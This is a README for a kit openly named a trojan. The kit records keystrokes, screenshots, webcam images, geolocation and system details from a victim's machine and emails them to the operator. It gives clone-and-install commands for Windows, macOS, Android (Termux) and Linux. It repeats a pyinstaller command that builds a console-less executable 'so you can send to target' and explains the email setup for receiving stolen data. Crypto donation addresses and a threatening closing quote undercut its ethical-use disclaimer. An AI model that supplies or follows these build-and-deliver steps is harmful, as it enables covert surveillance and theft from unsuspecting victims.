Trojan 2024: A Multi-Platform Information Gathering Script .

Features :
=======
Screenshots

Keystrokes

Hardware and network information

Geolocation data

Front camera captures

All data is securely delivered via email for your convenience.

Key Features
=======
Screenshot Capture: Automatically captures desktop activity every 60 seconds.

Keylogging: Records typed text at configurable intervals.

Hardware Information: Retrieves details like CPU, GPU, and RAM specs.

Network Data: Captures IP addresses, MAC addresses, and more.

Geolocation Tracking: Provides approximate location details.

Camera Access: Takes images using the front camera (if available).


How to install .
=====
Installation and Setup

Windows
==
Open PowerShell or Command Prompt.

git clone https://github.com/BlackNode-stack/2024Trojan.git

cd 2024Trojan

pip install -r requirements.txt

python Run.py

Generate a standalone executable so you can send to target .

pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py



macOS
==


Open the Terminal.

Clone this repository

git clone https://github.com/BlackNode-stack/2024Trojan.git

cd 2024Trojan

python3 -m pip install -r requirements.txt

python3 Run.py


Generate a standalone executable so you can send to target .

pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py


Termux (Android)
==
Install Termux from F-Droid or the Google Play Store.

Update packages

pkg update && pkg upgrade

pkg install git python

git clone https://github.com/BlackNode-stack/2024Trojan.git

cd 2024Trojanpip install -r requirements.txt

python Run.py

Generate a standalone executable so you can send to target .

pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py


Linux
===
Open the Terminal.

Clone this repository

git clone https://github.com/BlackNode-stack/2024Trojan.git

cd 2024Trojan

python3 -m pip install -r requirements.txt

python3 Run.py


Generate a standalone executable so you can send to target .

pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py


Usage Instructions
==
Email Configuration

During setup, you’ll need to provide:


The sender email.

The app password (generated through your email provider).

The recipient email address for receiving data.

Follow the platform-specific instructions to execute the script and ensure that data is sent correctly to your email.

make sure you read the how_to_use.txt


How it works .
==
When you run this command, pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py 

In your current folder, i.e. 2024Trojan, a dist folder will be created, where your executable file will be placed and you can send it to the target, it will start running when clicked.




Support
==
BTC Wallet: bc1q3kqdczj6q780y642yq9dvvfuk43g5a5uxn83f2

Ethereum Wallet: 0xE8e903eE127113c30aFd52acbDbdB567968534Ea

Feel free to support or donate if this tool was helpful to you! 😊

Disclaimer
==
Warning: This tool is intended for ethical and legal purposes only, such as cybersecurity research and penetration testing (with proper authorization). Unauthorized or malicious use of this script is illegal.

"Your defenses are paper walls against my storm. Every keystroke whispers your secrets; every shadow hides my trace. By the time you notice, I'll already be gone... or maybe I’ll just be watching."
